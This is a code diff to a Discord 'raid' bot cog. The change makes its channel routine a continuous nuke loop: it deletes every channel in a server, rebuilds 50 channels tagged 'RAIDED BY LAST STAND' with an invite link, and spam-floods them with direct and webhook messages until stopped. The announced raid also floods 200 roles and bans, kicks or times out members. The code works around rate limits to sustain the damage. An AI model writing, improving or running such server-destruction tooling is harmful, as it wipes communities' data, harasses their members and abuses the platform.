@@ -31,10 +31,11 @@ RAID_TAG  = "LAST STAND"
 RAID_LINK = "https://discord.gg/s59zWvzK6c"
 RAID_NAME = f"RAIDED BY {RAID_TAG}"
 
-CHANNEL_CAP    = 490
-CREATORS       = 5
-ROLE_FLOOD_MAX = 200
-SPAM_BURST     = 3   # messages sent per semaphore slot acquisition
+CHANNEL_CAP      = 490
+CREATORS         = 5
+ROLE_FLOOD_MAX   = 200
+SPAM_BURST       = 3    # messages sent per semaphore slot acquisition
+CREATE_PER_CYCLE = 50   # channels built per nuke cycle before looping back
 
 _SPAM_SEM = asyncio.Semaphore(35)
 _WH_SEM   = asyncio.Semaphore(25)
@@ -165,7 +166,7 @@ class Raid(commands.Cog):
         try:
             await reply(
                 f"☠️ **{RAID_TAG} — RAID LAUNCHED** ☠️\n"
-                f"┣ Concurrent delete → 3× channel creators → webhook boost\n"
+                f"┣ CONTINUOUS NUKE: delete all → rebuild {CREATE_PER_CYCLE} → spam → repeat\n"
                 f"┣ Role flood (200 roles) + member ban/kick/timeout\n"
                 f"┗ `/stop` or `.stop` to halt."
             )
@@ -230,103 +231,100 @@ class Raid(commands.Cog):
                 pass
 
     # ─────────────────────────────────────────────────────────────────────────
-    # CHANNEL LOOP
-    #   Phase 1: concurrent deletion (20 at a time) — much faster than sequential
-    #   Phase 2: 3 concurrent creator workers — 3× throughput vs sequential
-    #   Phase 3: webhook boost — 1 webhook per channel on top of direct sends
+    # CONTINUOUS NUKE LOOP
+    #   Repeats forever until /stop:
+    #     1. Delete ALL channels concurrently (sem=40)
+    #     2. Create 50 flood channels (5 concurrent workers)
+    #     3. Spam every new channel immediately (direct + webhook)
+    #     4. Go back to step 1 — nuke everything and rebuild again
+    #
+    #   Spam tasks from the previous cycle die naturally on NotFound when
+    #   channels are deleted. New ones spawn fresh each cycle.
     # ─────────────────────────────────────────────────────────────────────────
     async def _channel_loop(self, guild: discord.Guild) -> None:
-        se = bot_state.stop_event
+        se  = bot_state.stop_event
+        del_sem = asyncio.Semaphore(40)
+        cycle   = 0
+
+        async def _del(ch: discord.abc.GuildChannel) -> None:
+            async with del_sem:
+                try:
+                    await ch.delete()
+                except discord.NotFound:
+                    pass
+                except discord.Forbidden:
+                    pass
+                except discord.HTTPException as e:
+                    if e.status == 429:
+                        await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
+                except Exception:
+                    pass
 
         try:
-            # ── Phase 1: concurrent delete ────────────────────────────────────
-            existing = list(guild.channels)
-            print(f"[raid] concurrent-deleting {len(existing)} channels...", flush=True)
+            while not se.is_set():
+                cycle += 1
+                # ── delete everything ─────────────────────────────────────────
+                existing = list(guild.channels)
+                print(f"[nuke] cycle {cycle} — deleting {len(existing)} channels", flush=True)
+                await asyncio.gather(*[_del(ch) for ch in existing], return_exceptions=True)
 
-            del_sem = asyncio.Semaphore(40)
+                if se.is_set():
+                    break
 
-            async def _del(ch):
-                async with del_sem:
-                    try:
-                        await ch.delete()
-                    except discord.NotFound:
-                        pass
-                    except discord.Forbidden:
-                        print(f"[raid] 403 deleting #{ch.name}", flush=True)
-                    except discord.HTTPException as e:
-                        if e.status == 429:
-                            await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                    except Exception as e:
-                        print(f"[raid] delete error #{ch.name}: {e}", flush=True)
+                # ── rebuild 50 flood channels ─────────────────────────────────
+                created: list[discord.TextChannel] = []
+                lock = asyncio.Lock()
 
-            await asyncio.gather(*[_del(ch) for ch in existing], return_exceptions=True)
-            print("[raid] delete done", flush=True)
-
-            if se.is_set():
-                return
-
-            # ── Phase 2: 3 concurrent creator workers ─────────────────────────
-            # Each worker takes a slice of the index space so names don't collide.
-            created: list[discord.TextChannel] = []
-            lock = asyncio.Lock()
-
-            async def _creator(start: int, step: int) -> None:
-                i = start
-                while not se.is_set():
-                    async with lock:
-                        current_count = len(created)
-                    if current_count >= CHANNEL_CAP:
-                        break
-                    name = _ch_name(i)
-                    try:
-                        ch = await asyncio.wait_for(
-                            guild.create_text_channel(
-                                name,
-                                topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
-                            ),
-                            timeout=15.0,
-                        )
+                async def _creator(start: int, step: int) -> None:
+                    i = start
+                    while not se.is_set():
                         async with lock:
-                            created.append(ch)
-                            idx = len(created)
-                        print(f"[raid] created #{name} ({idx})", flush=True)
-                        bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
-                        bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
-                    except asyncio.TimeoutError:
-                        print(f"[raid] TIMEOUT #{name} — sleeping 5s", flush=True)
-                        await asyncio.sleep(5.0)
-                    except discord.Forbidden as e:
-                        print(f"[raid] 403 create #{name}: {e}", flush=True)
-                        await asyncio.sleep(2.0)
-                    except discord.HTTPException as e:
-                        print(f"[raid] HTTP {e.status} create #{name}: {e.text}", flush=True)
-                        if e.status == 429:
-                            await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
-                        else:
+                            n = len(created)
+                        if n >= CREATE_PER_CYCLE:
+                            break
+                        name = _ch_name(i + cycle * 1000)
+                        try:
+                            ch = await asyncio.wait_for(
+                                guild.create_text_channel(
+                                    name,
+                                    topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
+                                ),
+                                timeout=15.0,
+                            )
+                            async with lock:
+                                created.append(ch)
+                            print(f"[nuke] cycle {cycle} created #{name} ({len(created)})", flush=True)
+                            bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
+                            bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
+                        except asyncio.TimeoutError:
+                            await asyncio.sleep(5.0)
+                        except discord.Forbidden:
+                            await asyncio.sleep(2.0)
+                        except discord.HTTPException as e:
+                            if e.status == 429:
+                                await asyncio.sleep(float(getattr(e, "retry_after", 1.0)))
+                            else:
+                                await asyncio.sleep(1.0)
+                        except Exception:
                             await asyncio.sleep(1.0)
-                    except Exception as e:
-                        print(f"[raid] create error #{name}: {e}", flush=True)
-                        await asyncio.sleep(1.0)
-                    i += step
+                        i += step
 
-            await asyncio.gather(
-                _creator(0, CREATORS),
-                _creator(1, CREATORS),
-                _creator(2, CREATORS),
-                _creator(3, CREATORS),
-                _creator(4, CREATORS),
-                return_exceptions=True,
-            )
-            print(f"[raid] channel create done — {len(created)} channels", flush=True)
+                await asyncio.gather(
+                    _creator(0, CREATORS),
+                    _creator(1, CREATORS),
+                    _creator(2, CREATORS),
+                    _creator(3, CREATORS),
+                    _creator(4, CREATORS),
+                    return_exceptions=True,
+                )
+                print(f"[nuke] cycle {cycle} built {len(created)} channels — looping back", flush=True)
 
         except asyncio.CancelledError:
-            print("[raid] channel_loop cancelled", flush=True)
+            print("[nuke] channel_loop cancelled", flush=True)
         except Exception as e:
-            print(f"[raid] channel_loop CRASH: {type(e).__name__}: {e}", flush=True)
+            print(f"[nuke] channel_loop CRASH: {type(e).__name__}: {e}", flush=True)
         finally:
-            print("[raid] channel_loop exiting", flush=True)
-            # Do NOT clear active_simulation here — spam tasks are still running.
-            # Only /stop (bot_state.stop_all) should clear it.
+            print("[nuke] channel_loop exiting", flush=True)
 
     # ─────────────────────────────────────────────────────────────────────────
     # ADD WEBHOOK — called per channel immediately at creation time
